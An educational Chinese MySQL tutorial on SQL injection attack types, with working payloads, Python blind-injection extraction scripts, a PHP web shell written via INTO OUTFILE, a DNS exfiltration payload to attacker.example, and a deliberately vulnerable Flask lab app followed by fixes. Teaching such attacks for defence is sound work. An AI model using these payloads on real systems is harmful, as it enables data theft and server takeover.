---
order: 780
title: SQL 注入攻击类型与实战
module: 'mysql'
category: 数据库
difficulty: advanced
description: 联合注入、盲注、报错注入与绕过技巧。
author: fanquanpp
updated: '2026-08-02'
related:
  - 'mysql/076-MySQLControlApplication'
  - 'mysql/077-SQLInjectionBasicsDetection'
  - 'mysql/079-SQLInjectionDefenseStrategy'
  - 'mysql/080-MySQLProjectExampleDatabaseDesign'
prerequisites:
  - 'mysql/077-SQLInjectionBasicsDetection'
---

## 1. SQL 注入攻击类型 (Attack Types)

### 1.1 带内注入（In-band Injection）

带内注入是最常见和最容易实施的 SQL 注入类型，攻击者使用同一通道发送攻击和获取结果。

#### 1.1.1 基于错误的注入（Error-based）

利用数据库错误信息来获取数据，原理是构造会让数据库报错的表达式，并把目标数据拼进错误消息中回显。

**MySQL 示例**：

```sql
-- 假设 URL 参数：/product?id=1
-- EXTRACTVALUE 的 XPath 参数不合法时抛出错误，并附带 DATABASE() 的结果
1' AND EXTRACTVALUE(1, CONCAT(0x7e, DATABASE(), 0x7e)) -- 
-- 0x7e 是波浪号 ~，用于在错误信息中标记数据边界

-- 同样常用的还有 UPDATEXML
1' AND UPDATEXML(1, CONCAT(0x7e, (SELECT table_name FROM information_schema.tables LIMIT 1)), 1) -- 

-- 说明：EXTRACTVALUE / UPDATEXML 从 MySQL 5.1.5 开始提供，
-- 报错回显长度有限（约 32 字节），大量数据建议配合 SUBSTRING 分段获取
```

**SQL Server 示例**：

```sql
-- 将版本信息强制转换为 int，转换失败时在错误消息中回显 @@version
1' AND 1=CONVERT(int, @@version) -- 

-- 也可以逐条获取库名
1' AND 1=CONVERT(int, (SELECT TOP 1 name FROM sys.databases)) -- 
```

#### 1.1.2 UNION 查询注入

利用 UNION 操作符将恶意查询结果合并到正常查询中。

**前提条件**：

- 原查询与恶意查询的列数必须相同
- 对应位置的数据类型必须兼容

**攻击步骤**：

```sql
-- 步骤 1：确定列数（ORDER BY 逐次递增，直到报错）
1' ORDER BY 1 -- 
1' ORDER BY 2 -- 
1' ORDER BY 3 -- 
1' ORDER BY 4 --   -- 报错，说明原查询只有 3 列

-- 也可以用 UNION SELECT NULL 逐次试探列数
1' UNION SELECT NULL -- 
1' UNION SELECT NULL,NULL -- 
1' UNION SELECT NULL,NULL,NULL --   -- 成功，确定列数为 3

-- 步骤 2：确定页面回显位置
1' UNION SELECT 1,2,3 -- 
-- 观察页面上 1、2、3 哪个位置显示出来了

-- 步骤 3：获取数据库信息
1' UNION SELECT 1,DATABASE(),USER() -- 

-- 步骤 4：获取表名（GROUP_CONCAT 有长度限制，默认 1024 字节）
1' UNION SELECT 1,2,GROUP_CONCAT(table_name) FROM information_schema.tables WHERE table_schema=DATABASE() -- 

-- 步骤 5：获取列名
1' UNION SELECT 1,2,GROUP_CONCAT(column_name) FROM information_schema.columns WHERE table_schema=DATABASE() AND table_name='users' -- 

-- 步骤 6：获取用户数据
1' UNION SELECT 1,username,password FROM users -- 
```

#### 1.1.3 堆叠查询注入（Stacked Queries）

允许在一个查询中执行多条 SQL 语句，分号后可以继续追加任意语句。

```sql
-- 时间延迟验证
1'; SELECT SLEEP(5); -- 

-- 写入数据
1'; INSERT INTO users(username,password) VALUES('hacker','hack'); -- 

-- 危险操作（仅教学演示，切勿在真实环境执行）
1'; DROP TABLE users; -- 

-- 说明：堆叠查询依赖数据库驱动支持多语句执行（如 PHP mysqli 默认支持，
-- PDO 默认不支持）；追加的语句一般没有回显，常配合时间盲注或写文件利用
```

### 1.2 盲注（Blind Injection）

当应用程序不返回数据库错误信息时，攻击者需要通过其他方式推断数据。

#### 1.2.1 布尔盲注（Boolean Blind）

通过应用程序的响应差异来推断数据。

**判断逻辑**：

- 如果注入条件为真，页面正常显示
- 如果注入条件为假，页面显示不同或报错

```sql
-- 判断数据库名长度是否大于 0
1' AND LENGTH(DATABASE())>0 -- 

-- 判断数据库名第一个字符是否为 s
1' AND SUBSTRING(DATABASE(),1,1)='s' -- 

-- 用 ASCII 比较二分猜解（更高效）
1' AND ASCII(SUBSTRING(DATABASE(),1,1))>100 -- 

-- 判断是否存在 users 表
1' AND (SELECT COUNT(*) FROM information_schema.tables WHERE table_schema=DATABASE() AND table_name='users')>0 -- 
```

**自动化脚本**：

```python
import requests


def boolean_blind_injection(url):
    """布尔盲注：根据页面响应差异逐字符猜解数据库名。"""
    # 1. 猜解数据库名长度
    db_name_length = 0
    for i in range(1, 30):
        payload = f"1' AND LENGTH(DATABASE())={i} -- "
        response = requests.get(url, params={"id": payload})
        if "正常" in response.text:
            db_name_length = i
            print(f"数据库名长度：{i}")
            break

    # 2. 逐字符猜解数据库名
    db_name = ""
    charset = "abcdefghijklmnopqrstuvwxyz0123456789_"
    for pos in range(1, db_name_length + 1):
        for char in charset:
            payload = f"1' AND SUBSTRING(DATABASE(), {pos}, 1)='{char}' -- "
            response = requests.get(url, params={"id": payload})
            if "正常" in response.text:
                db_name += char
                print(f"第 {pos} 个字符：{char}")
                break

    print(f"数据库名：{db_name}")
    return db_name
```

#### 1.2.2 时间盲注（Time-based）

利用数据库延迟函数，通过响应时间来推断数据，适用于页面响应无差异的场景。

```sql
-- 判断注入点是否存在：响应延迟约 5 秒则成立
1' AND SLEEP(5) -- 

-- 条件成立时延迟 3 秒，用于逐字符猜解
1' AND IF(SUBSTRING(DATABASE(),1,1)='s',SLEEP(3),0) -- 
```

**时间盲注脚本**：

```python
import requests
import time


def time_based_injection(url):
    """时间盲注：通过响应延迟逐字符猜解数据库名。"""
    # 1. 先测试是否存在时间盲注
    payload = "1' AND SLEEP(5) -- "
    start_time = time.time()
    requests.get(url, params={"id": payload})
    end_time = time.time()
    if end_time - start_time < 5:
        print("不存在时间盲注")
        return ""
    print("存在时间盲注！")

    # 2. 逐字符猜解数据库名
    db_name = ""
    charset = "abcdefghijklmnopqrstuvwxyz0123456789_"
    for pos in range(1, 20):
        found = False
        for char in charset:
            payload = f"1' AND IF(SUBSTRING(DATABASE(), {pos}, 1)='{char}', SLEEP(3), 0) -- "
            start_time = time.time()
            requests.get(url, params={"id": payload})
            end_time = time.time()
            if end_time - start_time >= 3:
                db_name += char
                found = True
                print(f"第 {pos} 个字符：{char}")
                break
        if not found:
            break  # 当前字符长度已猜完

    print(f"数据库名：{db_name}")
    return db_name
```

### 1.3 二次注入（Second-order Injection）

恶意数据被存储在数据库中，之后在其他查询中被使用时触发注入。存储阶段不会触发，因为数据只是作为字符串写入；触发阶段再次拼接该数据时才产生注入。

**攻击场景**：

1. **存储阶段**：攻击者注册用户名 `admin' --`，系统将其存储到数据库
2. **触发阶段**：其他功能使用该用户名时，如修改密码的 SQL 查询

```python
# 1. 用户注册时输入恶意数据
def register(username, password):
    sql = f"INSERT INTO users (username, password) VALUES ('{username}', '{password}')"
    cursor.execute(sql)
    # 此时不会触发注入，因为只是把字符串写入数据库

# 2. 数据库中存储的值：admin' --
# 3. 其他功能拼接该值查询时触发注入
def get_user_profile(username):
    sql = f"SELECT * FROM users WHERE username = '{username}'"
    cursor.execute(sql)
    return cursor.fetchone()

# 4. 攻击者以 admin' -- 用户名登录后调用 get_user_profile
#    实际执行：SELECT * FROM users WHERE username = 'admin' --'
#    注释符后的内容被忽略，返回真正的 admin 用户信息
```

**实际案例**：
WordPress 插件中曾发现过二次注入漏洞，攻击者通过评论功能注入恶意代码，该代码在管理员查看评论时执行。

### 1.4 宽字节注入（Wide Byte Injection）

利用字符编码漏洞进行注入。

**原理**：

- 应用程序使用 `addslashes()` 或类似函数转义单引号，在引号前添加反斜杠 `\`（0x5c）
- 如果数据库连接使用宽字节编码（如 GBK），`0xbf5c` 或 `0xdf5c` 会被解析成一个宽字符，反斜杠被"吃掉"，后面的单引号失去转义

```sql
-- 输入 %bf%27（%27 是单引号），addslashes 处理后变成 %bf%5c%27
-- GBK 把 %bf%5c 解析为一个宽字符，%27 成为未转义的单引号
1%bf%27 UNION SELECT 1,2,3 -- 

-- 另一种常见写法是 %df%27
1%df%27 UNION SELECT 1,DATABASE(),USER() -- 

-- 说明：MySQL 5.7+ 配合 PHP 7+ 使用 UTF-8 连接时该场景已很少出现，
-- 但遗留系统（GBK 连接、addslashes 转义）仍可能存在
```

**防御方法**：

- 统一使用 UTF-8 编码，并将 `character_set_client` 设置为 `binary`，避免宽字节吸收反斜杠
- 使用参数化查询而不是字符串拼接
- 不要依赖 `addslashes()` 等转义函数作为唯一防线

### 1.5 联合注入（Union-based Injection）

详见 1.1.2 节。

### 1.6 带外注入（Out-of-band Injection）

当常规渠道（带内）无法获取数据时，使用 DNS、HTTP 等替代通道回传数据。

```sql
-- MySQL 经典做法：Windows 环境下用 LOAD_FILE 触发 UNC 路径请求，
-- 让数据库向攻击者控制的域名发起 DNS 查询，数据以子域名形式出现在 DNS 日志中
1' AND LOAD_FILE(CONCAT('\\\\', (SELECT table_name FROM information_schema.tables WHERE table_schema=DATABASE() LIMIT 1), '.attacker.example\\x')) -- 

-- 说明：
-- 1. 需要 FILE 权限，且目标为 Windows（UNC 路径才有效）
-- 2. MySQL 8.0 没有内置 HTTP 请求函数，其他 OOB 方式需要 UDF 扩展
-- 3. 实际利用条件苛刻，多数场景优先使用盲注替代
```

## 2. SQL 注入实战案例 (Practical Cases)

### 2.1 案例 1：绕过登录验证

#### 2.1.1 场景描述

一个简单的登录页面，用户输入用户名和密码。

#### 2.1.2 危险代码

```php
<?php
// 危险代码：直接拼接用户输入
$username = $_POST['username'];
$password = $_POST['password'];
$sql = "SELECT * FROM users WHERE username = '$username' AND password = '$password'";
$result = mysqli_query($conn, $sql);
if (mysqli_num_rows($result) > 0) {
    echo "登录成功！";
} else {
    echo "登录失败！";
}
?>
```

#### 2.1.3 攻击 Payload

```
用户名：admin' --
密码：任意值
```

#### 2.1.4 执行的 SQL

```sql
SELECT * FROM users WHERE username = 'admin' --' AND password = 'anything'
```

#### 2.1.5 结果分析

注释符 `--` 后面的内容被忽略，只验证了 `username = 'admin'`，如果存在 admin 用户，攻击者即可成功登录。

#### 2.1.6 其他 Payload 变体

```
用户名：admin' OR '1'='1' --
密码：任意值
```

```sql
SELECT * FROM users WHERE username = 'admin' OR '1'='1' --' AND password = 'x'
-- OR '1'='1' 恒为真，等价于返回 users 表全部记录
```

```
用户名：' OR 1=1 --
密码：任意值
```

```sql
SELECT * FROM users WHERE username = '' OR 1=1 --' AND password = 'x'
```

```
用户名：admin' UNION SELECT 1,'admin','password' --
密码：任意值
```

```sql
SELECT * FROM users WHERE username = 'admin' UNION SELECT 1,'admin','password' --' AND password = 'x'
-- 前提：users 表为 3 列（id, username, password），且 UNION 结果类型兼容
```

### 2.2 案例 2：UNION 查询获取数据

#### 2.2.1 场景描述

一个商品详情页面，通过 URL 参数 `id` 获取商品信息。

#### 2.2.2 危险代码

```python
# 危险代码：直接拼接用户输入
def get_product(product_id):
    sql = f"SELECT id, name, price FROM products WHERE id = {product_id}"
    cursor.execute(sql)
    return cursor.fetchone()
```

#### 2.2.3 攻击步骤

**步骤 1：确定列数**

```sql
1' ORDER BY 1 -- 
1' ORDER BY 2 -- 
1' ORDER BY 3 -- 
1' ORDER BY 4 --   -- 报错，说明只有 3 列
```

**步骤 2：确定显示位置**

```sql
1' UNION SELECT 1,2,3 -- 
-- 观察页面回显 1、2、3 中的哪一个
```

**步骤 3：获取数据库信息**

```sql
1' UNION SELECT 1,DATABASE(),USER() -- 
```

**步骤 4：获取表名**

```sql
1' UNION SELECT 1,2,GROUP_CONCAT(table_name) FROM information_schema.tables WHERE table_schema=DATABASE() -- 
```

**步骤 5：获取列名**

```sql
1' UNION SELECT 1,2,GROUP_CONCAT(column_name) FROM information_schema.columns WHERE table_schema=DATABASE() AND table_name='users' -- 
```

**步骤 6：获取用户数据**

```sql
1' UNION SELECT 1,username,password FROM users -- 
```

### 2.3 案例 3：布尔盲注

#### 2.3.1 场景描述

页面不显示数据库错误，但对不同的输入有不同的响应。

#### 2.3.2 攻击脚本

```python
import requests


def blind_injection(url):
    """布尔盲注：根据页面响应差异猜解数据库名。"""
    # 1. 猜解数据库名长度
    db_name_length = 0
    for i in range(1, 20):
        payload = f"1' AND LENGTH(DATABASE())={i} -- "
        response = requests.get(url, params={"id": payload})
        if "正常" in response.text:
            db_name_length = i
            break
    print(f"数据库名长度：{db_name_length}")

    # 2. 逐字符猜解数据库名
    db_name = ""
    for i in range(1, db_name_length + 1):
        for c in "abcdefghijklmnopqrstuvwxyz0123456789_":
            payload = f"1' AND SUBSTRING(DATABASE(), {i}, 1)='{c}' -- "
            response = requests.get(url, params={"id": payload})
            if "正常" in response.text:
                db_name += c
                break

    print(f"数据库名：{db_name}")
    return db_name
```

### 2.4 案例 4：时间盲注

#### 2.4.1 攻击脚本

```python
import requests
import time


def time_based_injection(url):
    """时间盲注：通过响应延迟猜解数据库名。"""
    # 1. 测试是否存在时间盲注
    start_time = time.time()
    requests.get(url, params={"id": "1' AND SLEEP(5) -- "})
    end_time = time.time()
    if end_time - start_time < 5:
        print("不存在时间盲注")
        return ""
    print("存在时间盲注！")

    # 2. 猜解数据库名
    db_name = ""
    for i in range(1, 20):
        found = False
        for c in "abcdefghijklmnopqrstuvwxyz0123456789_":
            payload = f"1' AND IF(SUBSTRING(DATABASE(), {i}, 1)='{c}', SLEEP(3), 0) -- "
            start_time = time.time()
            requests.get(url, params={"id": payload})
            end_time = time.time()
            if end_time - start_time >= 3:
                db_name += c
                found = True
                print(f"找到第 {i} 个字符：{c}")
                break
        if not found:
            break  # 当前长度已猜完

    print(f"数据库名：{db_name}")
    return db_name
```

### 2.5 案例 5：获取服务器 Shell

#### 2.5.1 前提条件

- MySQL 版本 >= 5.0（information_schema 可用）
- 当前用户具有 FILE 权限
- `secure_file_priv` 未限制，或允许写入 Web 目录
- Web 目录可写，且 MySQL 服务账户有写入权限

#### 2.5.2 攻击步骤

```sql
-- 1. 确认列数后，用 UNION + INTO OUTFILE 写入一句话木马
--    0x3C3F... 是 <?php system($_GET['cmd']); ?> 的十六进制形式，避免引号转义问题
1' UNION SELECT 1,0x3C3F7068702073797374656D28245F4745545B27636D64275D293B3F3E,3 INTO OUTFILE '/var/www/html/shell.php' -- 

-- 2. 若 OUTFILE 不可用，可尝试用堆叠查询配合 SELECT ... INTO OUTFILE
1'; SELECT '<?php system($_GET["cmd"]); ?>' INTO OUTFILE '/var/www/html/shell.php'; -- 

-- 说明：INTO OUTFILE 的列数必须与 SELECT 一致；
-- MySQL 5.7+ 默认 secure_file_priv 为 NULL（禁止导出），实际利用前需先探测
```

访问木马：

```
http://target.com/shell.php?cmd=whoami
```

#### 2.5.3 防御措施

- 限制 MySQL 用户的 FILE 权限，业务账号最小权限原则
- 将 `secure_file_priv` 设置为空目录或禁用导出
- Web 目录设置正确的权限，禁止数据库账户写入
- 使用参数化查询，从根源上消除注入

## 3. 本地实验环境搭建

以下内容用于在本地搭建可重复实验的环境，请仅在授权的测试环境（如 DVWA、sqli-labs、自己的虚拟机）中操作。

### 3.1 搭建测试环境

#### 3.1.1 创建测试数据库

```sql
-- 创建数据库
CREATE DATABASE IF NOT EXISTS sqli_test;
USE sqli_test;

-- 创建用户表
CREATE TABLE users (
    id INT PRIMARY KEY AUTO_INCREMENT,
    username VARCHAR(50) NOT NULL,
    password VARCHAR(50) NOT NULL,
    email VARCHAR(100),
    role VARCHAR(20) DEFAULT 'user',
    created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
);

-- 插入测试数据
INSERT INTO users (username, password, email, role) VALUES
('admin', 'admin123', 'admin@example.com', 'admin'),
('user1', 'user123', 'user1@example.com', 'user'),
('user2', 'user456', 'user2@example.com', 'user');

-- 创建商品表
CREATE TABLE products (
    id INT PRIMARY KEY AUTO_INCREMENT,
    name VARCHAR(100) NOT NULL,
    price DECIMAL(10, 2) NOT NULL,
    description TEXT,
    created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
);

-- 插入商品测试数据
INSERT INTO products (name, price, description) VALUES
('Product 1', 99.99, 'Description 1'),
('Product 2', 199.99, 'Description 2'),
('Product 3', 299.99, 'Description 3');
```

#### 3.1.2 创建 Vulnerable Web 应用

```python
from flask import Flask, request
import pymysql

app = Flask(__name__)


def get_db_connection():
    return pymysql.connect(
        host='localhost',
        user='root',
        password='password',
        database='sqli_test'
    )


@app.route('/product')
def product():
    product_id = request.args.get('id')
    # 危险代码：直接拼接，存在 SQL 注入
    conn = get_db_connection()
    cursor = conn.cursor()
    sql = f"SELECT * FROM products WHERE id = {product_id}"
    cursor.execute(sql)
    result = cursor.fetchone()
    conn.close()
    return str(result)


@app.route('/login', methods=['POST'])
def login():
    username = request.form.get('username')
    password = request.form.get('password')
    # 危险代码：直接拼接，存在 SQL 注入
    conn = get_db_connection()
    cursor = conn.cursor()
    sql = f"SELECT * FROM users WHERE username = '{username}' AND password = '{password}'"
    cursor.execute(sql)
    result = cursor.fetchone()
    conn.close()
    if result:
        return "Login successful!"
    return "Login failed!"


if __name__ == '__main__':
    app.run(debug=True, host='0.0.0.0', port=5000)
```

### 3.2 攻击演练

启动上面的 Flask 应用后，用 curl 或浏览器模拟攻击：

```bash
# 1. UNION 注入获取数据库名和当前用户
curl "http://localhost:5000/product?id=1%20UNION%20SELECT%201,DATABASE(),USER()--%20"

# 2. 布尔盲注：判断数据库名长度是否为 8（sqli_test 长度为 9，页面应无正常内容）
curl "http://localhost:5000/product?id=1%27%20AND%20LENGTH(DATABASE())=8--%20"

# 3. 登录绕过：admin 用户无需密码
curl -X POST -d "username=admin'-- &password=x" http://localhost:5000/login
```

**预期结果**：

- 第 1 条返回结果中同时出现 `sqli_test` 与当前数据库用户
- 第 2 条条件为假时页面不返回正常商品内容
- 第 3 条返回 `Login successful!`

### 3.3 修复演练

```python
@app.route('/product')
def product_safe():
    product_id = request.args.get('id')
    # 验证输入：只允许纯数字
    if not product_id.isdigit():
        return "Invalid product ID"
    # 使用参数化查询
    conn = get_db_connection()
    cursor = conn.cursor()
    sql = "SELECT * FROM products WHERE id = %s"
    cursor.execute(sql, (product_id,))
    result = cursor.fetchone()
    conn.close()
    return str(result)


@app.route('/login', methods=['POST'])
def login_safe():
    username = request.form.get('username')
    password = request.form.get('password')
    # 使用参数化查询，输入与 SQL 语句分离
    conn = get_db_connection()
    cursor = conn.cursor()
    sql = "SELECT * FROM users WHERE username = %s AND password = %s"
    cursor.execute(sql, (username, password))
    result = cursor.fetchone()
    conn.close()
    if result:
        return "Login successful!"
    return "Login failed!"
```

修复要点：

- 输入校验（`isdigit()`）拦截非数字参数
- 参数化查询让数据库把输入当数据而非 SQL 代码处理
- 完整防御方案（WAF、最小权限、错误信息隐藏等）见 075-SQLInjectionDefenseStrategy
